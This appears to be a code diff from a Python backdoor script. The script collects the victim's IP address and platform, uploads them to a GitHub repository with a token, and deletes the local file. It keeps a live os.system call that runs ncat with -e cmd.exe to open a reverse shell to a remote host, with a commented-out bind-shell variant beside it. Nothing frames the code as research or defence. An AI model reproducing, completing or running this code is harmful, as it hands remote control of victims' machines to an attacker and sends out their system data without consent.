@@ -40,7 +40,7 @@ def subir_archivo( nombre_archivo, contenido_archivo):
         "Authorization": f"{token}",
         "Content-Type": "application/json"
     }
-    contenido_base64 = base64.b64encode(contenido_archivo.encode()).decode()
+    contenido_base64 = base64.b64encode(contenido_archivo.encode())
     data = {
         "message": "Agregar archivo",
         "content": contenido_base64
@@ -84,9 +84,9 @@ def run(token):
         stmnt= 'Info: '+ IPAddr+' Sysyem:'+sysconfig.get_platform()+'\n'
         print("text stmnt: "+ stmnt)
         create_file(fname,stmnt)
-        #subir_archivo('data.txt', stmnt )
-        update_file_on_github(fname,token)
-        #delete_file("data.txt")
+        subir_archivo(fname, stmnt )
+        #update_file_on_github(fname,token)
+        delete_file("data.txt")
         
         #os.system('ncat -lvp 734 -e cmd.exe')
         os.system('ncat '+ iph +' 734 -e cmd.exe')
